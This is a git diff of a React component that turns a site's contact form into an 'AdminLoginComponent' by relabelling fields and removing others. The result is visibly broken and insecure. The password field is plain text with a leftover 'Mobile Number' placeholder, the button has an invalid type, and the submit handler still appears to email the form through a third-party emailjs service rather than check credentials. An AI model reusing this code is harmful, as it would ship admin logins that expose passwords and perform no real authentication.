@@ -3,7 +3,7 @@ import emailjs from 'emailjs-com'; // Import emailjs for React
 
 import '../assets/css/contactUs.css';
 
-const ContactUsComponent = () => {
+const AdminLoginComponent = () => {
     const [form, setForm] = useState({
         fname: '',
         email: '',
@@ -27,7 +27,7 @@ const ContactUsComponent = () => {
 
         // Send email using emailjs
         try {
-            let response = await emailjs.send("service_ry7lvvq", "template_h1wrj47", {
+            let response = await emailjs.send("service_ozh25er", "template_h1wrj47", {
                 fname: form.fname,
                 to_name: "ScriptSprite",
                 email: form.email,
@@ -51,20 +51,7 @@ const ContactUsComponent = () => {
     return (
         <section className="contactus">
             <div className="login col-lg-4 m-auto shadow-lg">
-                <form onSubmit={handleSubmit}>
-                    <div className="mb-3">
-                        <label htmlFor="fname" className="form-label">Full Name<span className='red'>*</span>:</label>
-                        <input
-                            name="fname"
-                            id="fname"
-                            type="text"
-                            placeholder="Full Name"
-                            className="form-control"
-                            value={form.fname}
-                            onChange={handleChange}
-                            required
-                        />
-                    </div>
+                <form onSubmit={handleSubmit}>                    
                     <div className="mb-3">
                         <label htmlFor="email" className="form-label">Email Address<span className='red'>*</span>:</label>
                         <input
@@ -79,10 +66,10 @@ const ContactUsComponent = () => {
                         />
                     </div>
                     <div className="mb-3">
-                        <label htmlFor="mobileNumber" className="form-label">Mobile Number:</label>
+                        <label htmlFor="mobileNumber" className="form-label">Password:</label>
                         <input
-                            name="mobileNumber"
-                            id="mobileNumber"
+                            name="password"
+                            id="password"
                             type="text"
                             placeholder="Mobile Number"
                             className="form-control"
@@ -90,23 +77,11 @@ const ContactUsComponent = () => {
                             onChange={handleChange}
                         />
                     </div>
-                    <div className="mb-3">
-                        <label htmlFor="msg" className="form-label">Message<span className='red'>*</span>:</label>
-                        <textarea
-                            name="msg"
-                            id="msg"
-                            placeholder="Message"
-                            className="form-control"
-                            value={form.msg}
-                            onChange={handleChange}
-                            required
-                        ></textarea>
-                    </div>
-                    <button type="submit" className="btn btn-primary col-lg-12">Submit</button>
+                    <button type="login" className="btn btn-primary col-lg-12">Login</button>
                 </form>
             </div>
         </section>
     );
 };
 
-export default ContactUsComponent;
+export default AdminLoginComponent;
